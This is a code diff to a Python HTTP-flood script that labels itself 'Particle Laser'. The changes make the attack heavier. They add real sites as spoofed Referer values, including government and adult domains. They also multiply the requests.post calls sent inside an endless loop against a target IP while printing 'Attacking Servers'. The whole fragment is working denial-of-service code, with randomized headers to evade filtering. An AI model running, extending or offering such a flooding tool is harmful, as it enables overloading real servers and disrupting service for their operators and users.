@@ -43,13 +43,13 @@ if os.name == "nt":
 print(green + f"\033[1;3mParticle Laser Is Starting..")
 time.sleep(2)
 while True:
+    counter = 1
+    counter = counter + 1
     for i in range(200):
         try:
-            counter = 1
-            counter = counter + 1
             y = random.choice(user_agents)
             url = ip
-            urls = ['https://www.dpr.go.id', 'https://www.yandex.com', 'https://eiht.my.id', 'https://www.google.com', 'https://www.nasa.gov', 'https://www.cia.gov', 'https://spacex.com']
+            urls = ['https://www.dpr.go.id', 'https://www.yandex.com', 'https://eiht.my.id', 'https://www.google.com', 'https://www.nasa.gov', 'https://www.cia.gov', 'https://spacex.com', 'https://lahelu.com', 'https://data.gov.il', 'https://kosred.com', 'https://pornhub.com']
             res = random.choice(urls)
             headers = {
                 "User-Agent": f"{y}",
@@ -58,6 +58,9 @@ while True:
                 "Referer": f"{res}",
                 "Cache-Control": "no-store, no-cache"
             }
+            response = requests.post(url, headers=headers)
+            response = requests.post(url, headers=headers)
+            response = requests.post(url, headers=headers)
             response = requests.post(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
         except KeyboardInterrupt:
